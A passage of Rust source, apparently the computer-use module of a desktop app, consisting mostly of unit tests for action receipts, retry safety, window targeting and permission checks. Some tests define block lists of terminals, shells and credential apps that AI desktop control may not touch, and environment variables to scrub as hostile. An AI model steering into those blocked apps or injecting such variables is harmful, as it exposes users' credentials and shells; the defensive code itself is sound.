        .ok_or_else(|| {
            AppError::new(
                "computer_use_coordinate_required",
                format!("Computer use requires a two-number {key}."),
            )
        })?;
    let x = values[0].as_i64().ok_or_else(|| {
        AppError::new(
            "computer_use_coordinate_invalid",
            "Coordinate x must be an integer.",
        )
    })?;
    let y = values[1].as_i64().ok_or_else(|| {
        AppError::new(
            "computer_use_coordinate_invalid",
            "Coordinate y must be an integer.",
        )
    })?;
    if !(0..=100_000).contains(&x) || !(0..=100_000).contains(&y) {
        return Err(AppError::new(
            "computer_use_coordinate_invalid",
            "Coordinates must be non-negative window-local values no larger than 100,000.",
        ));
    }
    Ok((x, y))
}

fn element_arg(arguments: &Value, key: &str) -> Result<u32, AppError> {
    arguments
        .get(key)
        .and_then(Value::as_u64)
        .and_then(|value| u32::try_from(value).ok())
        .ok_or_else(|| {
            AppError::new(
                "computer_use_element_required",
                format!("Computer use requires a numbered {key}."),
            )
        })
}

fn add_result_metadata(result: &mut Value, action_id: &str, target_app: &str) {
    let key = if result.get("structuredContent").is_some() {
        "structuredContent"
    } else {
        "structured_content"
    };
    if !result.get(key).is_some_and(Value::is_object) {
        result[key] = json!({});
    }
    if let Some(structured) = result.get_mut(key).and_then(Value::as_object_mut) {
        structured.insert("action_id".to_string(), json!(action_id));
        structured.insert("target_app".to_string(), json!(target_app));
    }
}

fn mcp_text(value: Value) -> Value {
    json!({
        "content": [{ "type": "text", "text": value.to_string() }],
        "isError": false,
        "structuredContent": value,
    })
}

fn mcp_error(error: &AppError) -> Value {
    json!({
        "content": [{ "type": "text", "text": json!({ "error": error.message }).to_string() }],
        "isError": true,
        "structuredContent": { "error": error },
    })
}

fn sanitize_line(value: &str) -> String {
    value.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn random_id() -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(32)
        .map(char::from)
        .collect()
}

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_millis() as u64)
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;

    #[tokio::test]
    async fn stopping_an_epoch_drops_initialization_without_waiting_for_its_reply() {
        struct Dropped(Arc<AtomicBool>);
        impl Drop for Dropped {
            fn drop(&mut self) {
                self.0.store(true, Ordering::SeqCst);
            }
        }
        let state = Arc::new(ComputerUseState::default());
        let dropped = Arc::new(AtomicBool::new(false));
        let (started, ready) = oneshot::channel();
        let owned = state.clone();
        let observed = dropped.clone();
        let task = tokio::spawn(async move {
            with_epoch_guard(&owned, 0, async move {
                let _drop = Dropped(observed);
                let _ = started.send(());
                std::future::pending::<Result<(), AppError>>().await
            })
            .await
        });
        ready.await.unwrap();
        invalidate_epoch(&state);
        let result = tokio::time::timeout(Duration::from_millis(250), task)
            .await
            .unwrap()
            .unwrap();
        assert_eq!(result.unwrap_err().code, "computer_use_stopped");
        assert!(dropped.load(Ordering::SeqCst));
    }

    #[test]
    fn action_transport_failure_is_not_marked_safe_to_repeat() {
        let error = action_delivery_unknown(AppError::new("timeout", "Timed out."), "action-1");
        let details = error.details.unwrap();
        assert_eq!(details["disposition"]["delivery"], "unknown");
        assert_eq!(details["disposition"]["retry"], "unsafe");
        assert_eq!(details["actionId"], "action-1");
    }

    #[test]
    fn pre_dispatch_denial_keeps_its_delivery_receipt_at_the_broker() {
        let result = json!({
            "isError": true,
            "content": [{"type":"text", "text":"Private browser is unavailable to desktop control."}],
            "structuredContent": {
                "error": {"code":"computer_use_private_browser_blocked"},
                "disposition": {"delivery":"not_delivered", "retry":"safe"}
            }
        });
        let error = action_delivery_unknown(driver_result_error(&result), "fixture-action");
        assert_eq!(error.code, "computer_use_private_browser_blocked");
        let details = error.details.unwrap();
        assert_eq!(details["disposition"]["delivery"], "not_delivered");
        assert_eq!(details["disposition"]["retry"], "safe");
    }

    #[test]
    fn uncertain_native_retry_metadata_never_authorizes_replay() {
        for disposition in [
            Value::Null,
            json!({"delivery":"unknown","retry":"unknown"}),
            json!({"delivery":"delivery_uncertain","retry":"safe"}),
            json!({"delivery":"delivered_unverified","retry":"unknown"}),
        ] {
            let mut error = AppError::new("ACTION_FAILED", "Native result");
            error.details =
                Some(json!({"disposition":disposition,"engineReceipt":{"original":disposition}}));
            let error = action_delivery_unknown(error, "uncertain-native");
            let details = error.details.unwrap();
            assert_eq!(details["disposition"]["retry"], "unsafe");
            assert_eq!(details["engineReceipt"]["original"], disposition);
        }
    }

    #[test]
    fn transport_failure_retires_the_run_but_policy_rejection_keeps_its_namespace() {
        for code in [
            "computer_use_driver_timeout",
            "computer_use_driver_stopped",
            "computer_use_engine_transport",
            "computer_use_engine_protocol",
            "computer_use_desktop_unavailable",
        ] {
            assert!(driver_failure_retires_run(&AppError::new(code, "fixture")));
        }
        for code in [
            "POLICY_DENIED",
            "ACTION_NOT_SUPPORTED",
            "computer_use_target_stale",
            "unsafe_modifier_lifetime",
        ] {
            assert!(!driver_failure_retires_run(&AppError::new(code, "fixture")));
        }
    }

    #[test]
    fn lost_desktop_retires_authority_without_erasing_prior_delivery() {
        let receipt = json!({
            "error": {"code":"POLICY_DENIED","details":{"clovy_code":"computer_use_desktop_unavailable"}},
            "disposition":{"delivery":"delivered_unverified","retry":"unsafe"}
        });
        let error = driver_result_error(&json!({"structuredContent":receipt}));
        assert!(driver_failure_retires_run(&error));
        let error = action_delivery_unknown(error, "desktop-lost");
        assert_eq!(
            error.details.unwrap()["disposition"]["delivery"],
            "delivered_unverified"
        );
        let mut unrelated = AppError::new("POLICY_DENIED", "Sensitive field");
        unrelated.details = Some(
            json!({"engineReceipt":{"error":{"details":{"clovy_code":"computer_use_sensitive_field_blocked"}}}}),
        );
        assert!(!driver_failure_retires_run(&unrelated));
    }

    #[test]
    fn engine_error_keeps_delivery_and_evidence_across_broker_error_conversion() {
        let receipt = json!({
            "error": { "code": "ACTION_TIMEOUT" },
            "disposition": { "delivery": "delivered_unverified", "retry": "unsafe" },
            "modality": "visible",
            "evidence": { "window": "fixture-window", "dispatch": "sent" }
        });
        let error = driver_result_error(
            &json!({ "isError": true, "structuredContent": receipt, "content": [{"type":"text", "text":"Timed out after dispatch."}] }),
        );
        assert_eq!(error.code, "ACTION_TIMEOUT");
        let error = action_delivery_unknown(error, "action-1");
        let details = error.details.unwrap();
        assert_eq!(details["disposition"]["delivery"], "delivered_unverified");
        assert_eq!(details["disposition"]["retry"], "unsafe");
        assert_eq!(details["modality"], "visible");
        assert_eq!(details["engineReceipt"]["evidence"]["dispatch"], "sent");
    }

    #[test]
    fn failure_after_a_successful_action_keeps_both_delivery_dispositions() {
        let subsequent = action_delivery_unknown(AppError::new("timeout", "Timed out."), "stage");
        let error = action_delivered_unverified(subsequent, "launch");
        let details = error.details.unwrap();
        assert_eq!(details["disposition"]["retry"], "unsafe");
        assert_eq!(details["subsequentDisposition"]["delivery"], "unknown");
        assert_eq!(details["subsequentActionId"], "stage");
        assert_eq!(details["actionId"], "launch");
    }

    #[test]
    fn interleaved_turns_cannot_inherit_the_other_turns_target_or_authorization() {
        let state = ComputerUseState::default();
        begin_run_lease(&state, turn_lease_key("a")).unwrap();
        begin_run_lease(&state, turn_lease_key("b")).unwrap();
        select_turn_owner(&state, "a").unwrap();
        let first_epoch = state.current_epoch();
        select_turn_owner(&state, "a").unwrap();
        assert_eq!(state.current_epoch(), first_epoch);
        state
            .authorized_apps
            .lock()
            .unwrap()
            .insert(AppAuthorizationKey::RequestedName("Fixture".into()));
        *state.target.lock().unwrap() = Some(TargetContext {
            native_owner: None,
            pid: 1,
            window_id: 2,
            app_name: "Fixture".into(),
            identity: AppIdentity {
                bundle_id: "org.example.fixture".into(),
                executable_path: PathBuf::from("/fixture"),
                process_creation: 1,
            },
            elements: HashMap::new(),
            capture_path: None,
            capture_sha256: None,
            capture_generation: 1,
            bounds: crate::computer_use_cursor::ScreenRect {
                x: 0.0,
                y: 0.0,
                width: 100.0,
                height: 100.0,
            },
        });
        select_turn_owner(&state, "b").unwrap();
        assert!(
            state.current_epoch() > first_epoch,
            "switching turns must retire the engine ref namespace"
        );
        assert!(state.target.lock().unwrap().is_none());
        assert!(state.authorized_apps.lock().unwrap().is_empty());
        let epoch = state.current_epoch();
        end_turn_lease_in(&state, "b").unwrap();
        assert!(state.current_epoch() > epoch);
        assert!(ensure_attended_run(&state).is_err());
        assert!(select_turn_owner(&state, "b").is_err());
        select_turn_owner(&state, "a").unwrap();
        assert!(ensure_attended_run(&state).is_ok());
    }

    #[test]
    fn a_stopped_action_cannot_publish_a_new_target() {
        let state = ComputerUseState::default();
        let epoch = state.current_epoch();
        let generation = state.attended_generation.load(Ordering::SeqCst);
        let target = WindowTarget {
            native_owner: None,
            pid: 1,
            window_id: 2,
            app_name: "Fixture".into(),
            identity: AppIdentity {
                bundle_id: "org.example.fixture".into(),
                executable_path: PathBuf::from("/fixture"),
                process_creation: 1,
            },
            title: "Fixture".into(),
            z_index: 0,
            x: 0.0,
            y: 0.0,
            width: 100.0,
            height: 100.0,
            is_on_screen: true,
            on_current_space: Some(true),
        };
        state.epoch.fetch_add(1, Ordering::SeqCst);
        assert!(store_target_selection(&state, &target, epoch, generation).is_err());
        assert!(state.target.lock().unwrap().is_none());
    }

    #[test]
    fn follow_up_capture_keeps_the_action_receipt_even_when_capture_fails() {
        let action = mcp_text(json!({ "action_id": "one", "result": "dispatched" }));
        let failed = combine_action_and_capture(
            action.clone(),
            Err(AppError::new("capture_failed", "Capture failed.")),
        );
        assert_eq!(failed["structuredContent"], action["structuredContent"]);
        assert_eq!(
            failed["captureAfterError"]["capture_after_error"]["code"],
            "capture_failed"
        );
        assert!(failed["content"].to_string().contains("Do not repeat"));
        let missing_content = combine_action_and_capture(
            json!({ "structuredContent": { "action_id": "two" } }),
            Err(AppError::new("capture_failed", "Capture failed.")),
        );
        assert!(missing_content["content"]
            .to_string()
            .contains("Do not repeat"));

        let observed =
            combine_action_and_capture(action.clone(), Ok(mcp_text(json!({ "tree": "button" }))));
        assert_eq!(observed["structuredContent"]["action_receipt"], action);
    }

    #[test]
    fn driver_prewarm_loses_to_stop_and_readiness_loss() {
        let state = ComputerUseState::default();
        replace_runtime_ready(&state, true);
        let epoch = state.epoch.load(Ordering::SeqCst);
        assert!(driver_prewarm_is_current(&state, epoch));

        state.epoch.fetch_add(1, Ordering::SeqCst);
        assert!(!driver_prewarm_is_current(&state, epoch));

        let next_epoch = state.epoch.load(Ordering::SeqCst);
        replace_runtime_ready(&state, false);
        assert!(!driver_prewarm_is_current(&state, next_epoch));
    }

    #[test]
    fn blocked_runtime_readiness_probe_cannot_publish_after_revocation() {
        let state = Arc::new(ComputerUseState::default());
        let probe_epoch = state.epoch.load(Ordering::SeqCst);
        let probe_blocked = Arc::new(std::sync::Barrier::new(2));
        let probe_can_publish = Arc::clone(&probe_blocked);
        let probe_state = Arc::clone(&state);
        let stale_probe = std::thread::spawn(move || {
            probe_can_publish.wait();
            publish_runtime_ready_probe(&probe_state, probe_epoch, true)
        });

        state.epoch.fetch_add(1, Ordering::SeqCst);
        replace_runtime_ready(&state, false);
        probe_blocked.wait();

        assert_eq!(stale_probe.join().expect("stale probe joins"), None);
        assert!(runtime_ready_is_current(&state, false));
    }

    #[test]
    fn driver_prewarm_single_flight_reopens_after_completion() {
        let in_flight = AtomicBool::new(false);
        assert!(DriverPrewarmInProgress::try_begin(&in_flight));
        let first = DriverPrewarmInProgress(&in_flight);
        assert!(!DriverPrewarmInProgress::try_begin(&in_flight));
        drop(first);
        assert!(DriverPrewarmInProgress::try_begin(&in_flight));
    }

    #[tokio::test]
    async fn permission_probe_is_single_flight_for_concurrent_pollers() {
        let coordinator = Arc::new(PermissionProbeCoordinator::default());
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let release = Arc::new(tokio::sync::Notify::new());
        let probe = {
            let calls = Arc::clone(&calls);
            let release = Arc::clone(&release);
            move |_prompt| {
                let calls = Arc::clone(&calls);
                let release = Arc::clone(&release);
                async move {
                    calls.fetch_add(1, Ordering::SeqCst);
                    release.notified().await;
                    Ok(PermissionProbe {
                        accessibility: true,
                        screen_recording: false,
                    })
                }
            }
        };

        let first = {
            let coordinator = Arc::clone(&coordinator);
            let probe = probe.clone();
            tokio::spawn(async move { coordinator.run(false, probe).await })
        };
        while calls.load(Ordering::SeqCst) == 0 {
            tokio::task::yield_now().await;
        }
        let second = {
            let coordinator = Arc::clone(&coordinator);
            let probe = probe.clone();
            tokio::spawn(async move { coordinator.run(false, probe).await })
        };
        tokio::task::yield_now().await;
        assert_eq!(calls.load(Ordering::SeqCst), 1);

        release.notify_waiters();
        let first = first.await.expect("first poller").expect("first result");
        let second = second.await.expect("second poller").expect("second result");
        assert_eq!(first, second);
        assert_eq!(calls.load(Ordering::SeqCst), 1);
    }

    fn checks(grant_enabled: bool, driver: DriverCheck, granted: Option<bool>) -> StatusChecks {
        StatusChecks {
            platform_supported: true,
            grant_enabled,
            driver,
            permissions: granted.map(|granted| {
                Ok(PermissionProbe {
                    accessibility: granted,
                    screen_recording: granted,
                })
            }),
        }
    }

    /// D4: ready needs only the grant, the pinned driver and the macOS
    /// permissions; no plan, vision model or rollout answer is an input.
    #[test]
    fn status_is_ready_from_local_facts_alone() {
        let status = status_from_checks(checks(
            true,
            DriverCheck::Ready("0.4.2".to_string()),
            Some(true),
        ));

        assert!(status.ready);
        assert_eq!(status.state, "ready");
        assert_eq!(status.driver_version.as_deref(), Some("0.4.2"));
        let json = serde_json::to_value(&status).unwrap();
        for gone in ["planEligible", "modelSupportsVision", "generationModel"] {
            assert!(json.get(gone).is_none(), "{gone} is still reported");
        }
    }

    #[test]
    fn status_states_follow_grant_driver_and_permissions() {
        let off = status_from_checks(checks(false, DriverCheck::Ready("0.4.2".into()), None));
        assert_eq!((off.state.as_str(), off.ready), ("off", false));
        assert!(off.driver_available);

        let missing = status_from_checks(checks(true, DriverCheck::Missing("gone".into()), None));
        assert_eq!(missing.state, "driver_missing");
        assert_eq!(missing.error.as_deref(), Some("gone"));
        let hidden = status_from_checks(checks(false, DriverCheck::Missing("gone".into()), None));
        assert_eq!((hidden.state.as_str(), hidden.error), ("off", None));

        let mismatch = status_from_checks(checks(true, DriverCheck::Mismatch("sig".into()), None));
        assert_eq!(mismatch.state, "driver_mismatch");

        let denied = status_from_checks(checks(
            true,
            DriverCheck::Ready("0.4.2".into()),
            Some(false),
        ));
        assert_eq!(
            (denied.state.as_str(), denied.ready),
            ("permission_missing", false)
        );

        let unsupported = status_from_checks(StatusChecks {
            platform_supported: false,
            ..checks(true, DriverCheck::Ready("0.4.2".into()), Some(true))
        });
        assert_eq!(
            (unsupported.state.as_str(), unsupported.ready),
            ("unsupported", false)
        );
    }

    #[test]
    fn permission_probe_timeout_is_not_reported_as_missing_permissions() {
        let status = permission_probe_status(Err(AppError::new(
            "computer_use_driver_timeout",
            "The Computer use driver did not respond in time.",
        )));

        assert_eq!(status.state, "error");
        assert_ne!(
            (status.accessibility, status.state),
            (false, "permission_missing")
        );
        assert!(!status.ready);
        assert!(status.error.is_some());
    }

    #[test]
    fn signature_cache_invalidates_on_bundle_change_and_explicit_retry() {
        fn file(name: &str, length: u64) -> FileFingerprint {
            FileFingerprint {
                path: PathBuf::from(name),
                length,
                modified_ns: 42,
                #[cfg(unix)]
                device: 1,
                #[cfg(unix)]
                inode: length,
            }
        }
        let fingerprint = BundleFingerprint {
            outer_executable: file("outer-executable", 100),
            outer_resources: file("outer-resources", 200),
            helper_executable: file("helper-executable", 300),
            helper_resources: file("helper-resources", 400),
        };
        let cached = CachedBundleSignature {
            fingerprint: fingerprint.clone(),
        };
        assert!(signature_cache_matches(Some(&cached), &fingerprint, false));
        assert!(!signature_cache_matches(Some(&cached), &fingerprint, true));

        let mut changed = fingerprint.clone();
        changed.outer_executable.length += 1;
        assert!(!signature_cache_matches(Some(&cached), &changed, false));
    }

    #[test]
    fn duplicate_run_release_is_idempotent() {
        let state = ComputerUseState::default();
        begin_run_lease(&state, "run-a".to_string()).expect("begin first run");
        let generation = state.attended_generation.load(Ordering::SeqCst);

        assert_eq!(
            end_run_lease(&state, "run-a").expect("end first run"),
            Some(generation)
        );
        assert_eq!(
            end_run_lease(&state, "run-a").expect("repeat end first run"),
            None
        );
        assert!(idle_generation_is_current(&state, generation));
    }

    #[test]
    fn successor_run_blocks_stale_idle_cleanup() {
        let state = ComputerUseState::default();
        begin_run_lease(&state, "run-a".to_string()).expect("begin first run");
        let stale_generation = end_run_lease(&state, "run-a")
            .expect("end first run")
            .expect("idle generation");

        begin_run_lease(&state, "run-b".to_string()).expect("begin successor run");

        assert!(!idle_generation_is_current(&state, stale_generation));
        assert_eq!(
            end_run_lease(&state, "run-a").expect("repeat end predecessor"),
            None
        );
        assert!(
            state
                .attended_runs
                .lock()
                .expect("run lease lock")
                .contains("run-b"),
            "a duplicate predecessor release must not remove the successor"
        );
        assert!(has_attended_run(&state));
    }

    #[test]
    fn non_secret_computer_use_grant_never_uses_keychain() {
        let source = include_str!("computer_use.rs");
        let start = source
            .find("pub(crate) async fn grant_enabled")
            .expect("grant read boundary");
        let end = source[start..]
            .find("fn bundled_driver_executable")
            .map(|offset| start + offset)
            .expect("grant storage boundary");

        assert!(
            !source[start..end].contains("keyring::Entry"),
            "the non-secret Computer use grant must not trigger a Keychain authorization prompt"
        );
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn permission_drag_publishes_the_bundle_owned_by_each_permission() {
        let driver = Path::new(
            "/tmp/Clovy Computer Use Driver.app/Contents/MacOS/clovy-computer-use-driver",
        );
        let host = Path::new("/Applications/Clovy.app/Contents/MacOS/clovy");
        assert_eq!(
            permission_drag_bundle_path(
                crate::computer_use_permission_drag::PermissionDragTarget::Helper,
                driver,
                host,
            ),
            Some(PathBuf::from("/tmp/Clovy Computer Use Driver.app"))
        );
        assert_eq!(
            permission_drag_bundle_path(
                crate::computer_use_permission_drag::PermissionDragTarget::Host,
                driver,
                host,
            ),
            Some(PathBuf::from("/Applications/Clovy.app"))
        );
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn driver_launch_uses_launch_services_and_the_helper_bundle() {
        let executable = Path::new(
            "/tmp/Clovy Computer Use Driver.app/Contents/MacOS/clovy-computer-use-driver",
        );
        let browser_runtime = crate::computer_use_owned_runtime::OwnedBrowserRuntime::new(
            PathBuf::from("/tmp/browser/chrome"),
            PathBuf::from("/tmp/browser/chrome/browser"),
        );
        let launch = driver_launch_spec(
            executable,
            Path::new("/tmp/clovy-cua-test/driver.sock"),
            "a-secret-capability",
            Some(DriverPermissionPrompt::ScreenRecording),
            &browser_runtime,
        )
        .expect("valid helper bundle");

        assert_eq!(launch.program, PathBuf::from("/usr/bin/open"));
        assert!(launch.args.iter().any(|arg| arg == "-n"));
        assert!(launch.args.iter().any(|arg| arg == "-g"));
        assert!(launch
            .args
            .iter()
            .any(|arg| { arg == "/tmp/Clovy Computer Use Driver.app" }));
        assert!(launch
            .args
            .iter()
            .any(|arg| { arg == "CLOVY_COMPUTER_USE_PERMISSION_PROMPT=screen-recording" }));
    }

    #[test]
    fn permission_prompts_are_requested_one_at_a_time() {
        assert_eq!(
            next_permission_prompt(&PermissionProbe {
                accessibility: false,
                screen_recording: false,
            }),
            Some(DriverPermissionPrompt::Accessibility),
        );
        assert_eq!(
            next_permission_prompt(&PermissionProbe {
                accessibility: true,
                screen_recording: false,
            }),
            Some(DriverPermissionPrompt::ScreenRecording),
        );
        assert_eq!(
            next_permission_prompt(&PermissionProbe {
                accessibility: true,
                screen_recording: true,
            }),
            None,
        );
    }

    fn fixture_identity(bundle_id: &str, executable: &str) -> AppIdentity {
        AppIdentity {
            bundle_id: bundle_id.to_string(),
            executable_path: PathBuf::from(executable),
            process_creation: 1,
        }
    }

    fn fixture_window_identity(bundle_id: &str) -> AppIdentity {
        static ROOT: OnceLock<tempfile::TempDir> = OnceLock::new();
        let root = ROOT.get_or_init(|| {
            let root = tempfile::tempdir().unwrap();
            std::fs::write(root.path().join("ordinary-app"), b"fixture").unwrap();
            root
        });
        AppIdentity {
            bundle_id: bundle_id.to_string(),
            executable_path: root.path().join("ordinary-app"),
            process_creation: 1,
        }
    }

    fn configured_window_state() -> (tempfile::TempDir, ComputerUseState) {
        let root = tempfile::tempdir().unwrap();
        let namespace = root.path().join("chrome");
        std::fs::create_dir(&namespace).unwrap();
        let image = namespace.join("browser");
        std::fs::write(&image, b"private browser fixture").unwrap();
        let state = ComputerUseState::default();
        state
            .set_browser_runtime(crate::computer_use_owned_runtime::OwnedBrowserRuntime::new(
                namespace, image,
            ))
            .unwrap();
        (root, state)
    }

    #[test]
    fn launch_receipt_identity_cannot_be_replaced_by_a_reused_pid() {
        let path_a = std::env::temp_dir().join("clovy-launch-a.exe");
        let path_b = std::env::temp_dir().join("clovy-launch-b.exe");
        let original = fixture_identity("org.example.fixture", path_a.to_str().unwrap());
        let receipt = json!({
            "pid": 42,
            "executable_path": path_a,
            "process_creation_time": 1,
            "bundle_id": "org.example.fixture"
        });
        let exact = verified_launched_identity(&receipt, true, |pid| {
            assert_eq!(pid, 42);
            Some(original.clone())
        })
        .unwrap();
        assert_eq!(exact, (42, original.clone()));

        for replacement in [
            AppIdentity {
                process_creation: 2,
                ..original.clone()
            },
            fixture_identity("org.example.other", path_b.to_str().unwrap()),
            fixture_identity("org.example.other", path_a.to_str().unwrap()),
        ] {
            assert_eq!(
                verified_launched_identity(&receipt, true, |_| Some(replacement))
                    .unwrap_err()
                    .code,
                "computer_use_target_unverified"
            );
        }
        assert!(verified_launched_identity(&receipt, true, |_| None).is_err());
        let mut pid_only = receipt.clone();
        pid_only
            .as_object_mut()
            .unwrap()
            .remove("process_creation_time");
        assert!(verified_launched_identity(&pid_only, false, |_| {
            panic!("a PID-only receipt must fail before adopting any current process")
        })
        .is_err());
        let mut without_bundle = receipt.clone();
        without_bundle.as_object_mut().unwrap().remove("bundle_id");
        assert!(
            verified_launched_identity(&without_bundle, true, |_| Some(original.clone())).is_err()
        );
        // Windows authority is the exact executable and process generation.
        assert!(
            verified_launched_identity(&without_bundle, false, |_| Some(original.clone())).is_ok()
        );
    }

    fn fixture_target() -> TargetContext {
        TargetContext {
            native_owner: None,
            pid: 42,
            window_id: 84,
            app_name: "TextEdit".to_string(),
            identity: fixture_window_identity("com.apple.TextEdit"),
            elements: HashMap::from([(
                7,
                ElementSummary {
                    role: "AXTextArea".to_string(),
                    label: "Body".to_string(),
                    metadata: "AXTextArea \"Body\" editable=true".to_string(),
                },
            )]),
            capture_path: Some("/tmp/capture.png".to_string()),
            capture_sha256: Some("abc".to_string()),
            capture_generation: 1,
            bounds: crate::computer_use_cursor::ScreenRect {
                x: 100.0,
                y: 200.0,
                width: 900.0,
                height: 700.0,
            },
        }
    }

    fn fixture_windows() -> Vec<WindowTarget> {
        vec![
            WindowTarget {
                native_owner: None,
                pid: 10,
                window_id: 100,
                app_name: "TextEdit".to_string(),
                identity: fixture_window_identity("com.apple.TextEdit"),
                title: "First note".to_string(),
                z_index: 1,
                x: 100.0,
                y: 200.0,
                width: 900.0,
                height: 700.0,
                is_on_screen: true,
                on_current_space: Some(true),
            },
            WindowTarget {
                native_owner: None,
                pid: 10,
                window_id: 101,
                app_name: "TextEdit".to_string(),
                identity: fixture_window_identity("com.apple.TextEdit"),
                title: "Second note".to_string(),
                z_index: 2,
                x: 110.0,
                y: 210.0,
                width: 900.0,
                height: 700.0,
                is_on_screen: true,
                on_current_space: Some(true),
            },
            WindowTarget {
                native_owner: None,
                pid: 20,
                window_id: 200,
                app_name: "Preview".to_string(),
                identity: fixture_window_identity("com.apple.Preview"),
                title: "Document".to_string(),
                z_index: 3,
                x: -900.0,
                y: 100.0,
                width: 900.0,
                height: 700.0,
                is_on_screen: true,
                on_current_space: Some(true),
            },
        ]
    }

    #[tokio::test]
    async fn line_reader_enforces_the_limit_while_reading() {
        let mut reader = BufReader::new(&b"abc\nnext\n"[..]);
        assert_eq!(
            read_bounded_line(&mut reader, 4).await.expect("first line"),
            BoundedLine::Line("abc\n".to_string())
        );
        assert_eq!(
            read_bounded_line(&mut reader, 5)
                .await
                .expect("second line"),
            BoundedLine::Line("next\n".to_string())
        );
        assert_eq!(
            read_bounded_line(&mut reader, 5).await.expect("eof"),
            BoundedLine::Eof
        );

        let mut oversized = BufReader::new(&b"12345"[..]);
        assert_eq!(
            read_bounded_line(&mut oversized, 4)
                .await
                .expect("bounded read"),
            BoundedLine::TooLarge
        );
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn release_self_test_window_results_are_scoped_to_the_requested_fixture() {
        let result = mcp_text(json!({
            "windows": [
                { "pid": 41, "window_id": 1, "title": "Requested fixture" },
                { "pid": 42, "window_id": 2, "title": "Private unrelated window" },
            ],
            "window_count": 2,
        }));
        let sanitized = sanitize_release_self_test_result(
            "list_windows",
            &json!({ "pid": 41, "on_screen_only": false }),
            result,
        )
        .expect("valid list_windows result");
        let structured = structured(&sanitized).expect("structured result");
        assert_eq!(structured["window_count"], 1);
        assert_eq!(structured["windows"][0]["pid"], 41);
        assert!(!sanitized.to_string().contains("Private unrelated window"));
    }

    #[test]
    fn hostile_driver_environment_is_scrubbed() {
        for name in [
            "CUA_DRIVER_RS_MCP_FORCE_PROXY",
            "CUA_DRIVER_RS_MCP_NO_RELAUNCH",
            "CUA_DRIVER_RS_PERMISSIONS_GATE",
            "CUA_DRIVER_RS_FUTURE_ESCAPE",
            "CLOVY_CUA_DRIVER_CMD",
            "CLOVY_CUA_DRIVER_VERSION",
            "JUNE_CUA_DRIVER_CMD",
            "JUNE_CUA_DRIVER_VERSION",
            "CLOVY_COMPUTER_USE_BACKEND",
            "CLOVY_COMPUTER_USE_BROWSER_NAMESPACE",
            "CLOVY_COMPUTER_USE_BROWSER_IMAGE",
            "HTTPS_PROXY",
        ] {
            assert!(should_scrub_driver_env(OsStr::new(name)), "{name}");
        }
        assert!(!should_scrub_driver_env(OsStr::new("HOME")));
        assert!(!should_scrub_driver_env(OsStr::new("TMPDIR")));
    }

    #[test]
    fn blocked_apps_cover_self_terminal_security_and_credentials() {
        for app in [
            "Clovy",
            "Terminal",
            "iTerm2",
            "System Settings",
            "universalAccessAuthWarn",
            "com.apple.accessibility.universalAccessAuthWarn",
            "Keychain Access",
            "SecurityAgent",
            "ChatGPT",
            "Codex",
            "1Password",
            "Strongbox",
            "WindowsTerminal.exe",
            "cmd.exe",
            "powershell.exe",
            "pwsh.exe",
            "CredentialUIBroker.exe",
            "consent.exe",
            "LogonUI.exe",
        ] {
            assert!(blocked_app(app), "{app}");
        }
        assert!(!blocked_app("TextEdit"));
        assert!(!blocked_app("Numbers"));
    }

    #[test]
    fn macos_accessibility_authorization_helper_is_not_an_operable_app() {
        let identity = fixture_identity(
            "com.apple.accessibility.universalAccessAuthWarn",
            "/System/Library/PrivateFrameworks/UniversalAccess.framework/Versions/A/Resources/universalAccessAuthWarn.app/Contents/MacOS/universalAccessAuthWarn",
        );

        assert!(blocked_target(
            &ComputerUseState::default(),
            "macOS access prompt",
            &identity
        ));
    }

    #[test]
    fn window_policy_requires_host_context_and_rejects_private_runtime() {
        let external = fixture_window_identity("org.example.external");
        assert!(blocked_target(
            &ComputerUseState::default(),
            "Editor",
            &external
        ));
        let (root, state) = configured_window_state();
        assert!(!blocked_target(&state, "Editor", &external));
        let private = AppIdentity {
            executable_path: root.path().join("chrome/browser"),
            ..external.clone()
        };
        assert!(blocked_target(&state, "Browser", &private));
        let mut windows = fixture_windows();
        windows[0].identity = private;
        assert_eq!(
            select_window(&state, &windows, None, Some(100))
                .unwrap_err()
                .code,
            "computer_use_target_blocked"
        );
        std::fs::remove_file(root.path().join("chrome/browser")).unwrap();
        assert!(blocked_target(&state, "Editor", &external));
    }

    #[test]
    fn exact_window_selection_never_guesses_between_matches() {
        let (_root, state) = configured_window_state();
        let windows = fixture_windows();
        assert_eq!(
            select_window(&state, &windows, Some("Second note"), None)
                .expect("exact title")
                .window_id,
            101
        );
        assert_eq!(
            select_window(&state, &windows, None, Some(100))
                .expect("exact id")
                .window_id,
            100
        );
        assert_eq!(
            select_window(&state, &windows, Some("Preview"), None)
                .expect("single app window")
                .window_id,
            200
        );
        assert_eq!(
            select_window(&state, &windows, Some("TextEdit"), None)
                .expect_err("same-app windows are ambiguous")
                .code,
            "computer_use_target_ambiguous"
        );
        assert_eq!(
            select_window(&state, &windows, None, None)
                .expect_err("implicit target is unsafe")
                .code,
            "computer_use_target_required"
        );
        assert_eq!(
            select_window(&state, &windows, Some("Preview"), Some(100))
                .expect_err("model app text must not relabel another app's exact window")
                .code,
            "computer_use_target_mismatch"
        );
    }

    #[test]
    fn approval_and_execution_share_normalized_action_names() {
        assert_eq!(
            normalized_action(&json!({ "action": "  Type  " })).unwrap(),
            "type"
        );
        assert_eq!(
            normalized_action(&json!({ "action": "mystery" }))
                .unwrap_err()
                .code,
            "computer_use_action_invalid"
        );
    }

    #[test]
    fn window_id_for_app_b_with_app_a_is_denied() {
        let (_root, state) = configured_window_state();
        let mut windows = fixture_windows();
        windows[0].app_name = "Notes".to_string();
        windows[0].window_id = 10;
        windows[1].app_name = "Mail".to_string();
        windows[1].window_id = 20;

        let denied = select_window(&state, &windows, Some("Notes"), Some(20)).unwrap_err();

        assert_eq!(denied.code, "computer_use_target_mismatch");
        assert!(denied.message.contains("does not own"));
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn stage_manager_thumbnails_and_hidden_windows_require_restore() {
        let mut window = fixture_windows().remove(0);
        assert!(!window_needs_restore(&window));

        window.width = 80.0;
        window.height = 111.0;
        assert!(window_needs_restore(&window));

        window.width = 900.0;
        window.height = 700.0;
        window.is_on_screen = false;
